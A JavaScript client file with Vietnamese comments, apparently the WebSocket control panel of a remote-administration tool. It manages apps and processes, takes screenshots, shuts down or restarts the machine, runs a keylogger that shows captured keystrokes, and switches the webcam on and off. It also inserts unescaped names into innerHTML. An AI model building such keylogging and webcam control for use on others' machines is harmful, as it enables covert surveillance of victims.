// WebSocket Connection
const ws = new WebSocket('ws://localhost:8080'); // Thay bằng IP Server thực tế

ws.onopen = () => console.log("Kết nối WebSocket thành công!");
ws.onclose = () => console.log("Mất kết nối!");
ws.onerror = (err) => console.error("Lỗi WS:", err);

// Tab switching
document.querySelectorAll('.tab-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById(btn.dataset.tab).classList.add('active');
  });
});

// [1] Quản lý Ứng dụng
document.getElementById('list-apps').onclick = () => send({ action: 'app_list' });

ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  handleResponse(data);
};

// Xử lý phản hồi từ Server
function handleResponse(data) {
  if (data.response && data.response.length > 0) {
    if (data.action === 'app_list') renderApps(data.response);
    if (data.action === 'process_list') renderProcesses(data.response);
  }
  if (data.update) {
    document.getElementById('keylog-display').textContent += data.update;
  }
  if (data.binary_start) {
    // Xử lý ảnh hoặc video
  }
}

function renderApps(apps) {
  const tbody = document.querySelector('#apps-table tbody');
  tbody.innerHTML = '';
  apps.forEach(app => {
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${app}</td>
      <td>
        <button class="btn success" onclick="startApp('${app}')">Start</button>
        <button class="btn danger" onclick="stopApp('${app}')">Stop</button>
      </td>
    `;
    tbody.appendChild(tr);
  });
}

function startApp(name) { send({ action: 'app_start', params: { name } }); }
function stopApp(name) { send({ action: 'app_stop', params: { name } }); }

// [2] Tiến trình
document.getElementById('list-processes').onclick = () => send({ action: 'process_list' });
document.getElementById('start-process-btn').onclick = () => {
  const path = document.getElementById('new-process-path').value.trim();
  if (path) send({ action: 'process_start', params: { name: path } });
};

document.getElementById('process-search').oninput = (e) => {
  const term = e.target.value.toLowerCase();
  document.querySelectorAll('#processes-table tbody tr').forEach(row => {
    const name = row.cells[1].textContent.toLowerCase();
    row.style.display = name.includes(term) ? '' : 'none';
  });
};

function renderProcesses(processes) {
  const tbody = document.querySelector('#processes-table tbody');
  tbody.innerHTML = '';
  processes.forEach(p => {
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${p.pid}</td>
      <td>${p.name}</td>
      <td>${p.cpu}</td>
      <td>${p.mem}</td>
      <td>
        <button class="btn danger" onclick="killProcess(${p.pid})">Dừng</button>
      </td>
    `;
    tbody.appendChild(tr);
  });
}

function killProcess(pid) { send({ action: 'process_stop', params: { pid } }); }

// [3] Chụp màn hình
document.getElementById('take-screenshot').onclick = () => {
  send({ action: 'screenshot' });
  // Server sẽ gửi binary → cần xử lý Blob sau
};

// [4] Keylogger
document.getElementById('start-keylogger').onclick = () => {
  send({ action: 'keylogger_start' });
  toggleKeylogger(true);
};
document.getElementById('stop-keylogger').onclick = () => {
  send({ action: 'keylogger_stop' });
  toggleKeylogger(false);
};
document.getElementById('clear-log').onclick = () => {
  document.getElementById('keylog-display').textContent = '';
};

function toggleKeylogger(start) {
  document.getElementById('start-keylogger').disabled = start;
  document.getElementById('stop-keylogger').disabled = !start;
}

// [5] Tắt / Khởi động lại
document.getElementById('shutdown-btn').onclick = () => {
  if (confirm('Bạn có chắc chắn muốn TẮT máy?')) {
    send({ action: 'shutdown' });
  }
};
document.getElementById('restart-btn').onclick = () => {
  if (confirm('Bạn có chắc chắn muốn KHỞI ĐỘNG LẠI máy?')) {
    send({ action: 'restart' });
  }
};

// [6] Webcam
document.getElementById('webcam-on').onclick = () => {
  send({ action: 'webcam_on' });
  document.getElementById('webcam-on').disabled = true;
  document.getElementById('webcam-off').disabled = false;
};
document.getElementById('webcam-off').onclick = () => {
  send({ action: 'webcam_off' });
  document.getElementById('webcam-on').disabled = false;
  document.getElementById('webcam-off').disabled = true;
};

// Gửi lệnh
function send(obj) {
  if (ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify(obj));
  }
}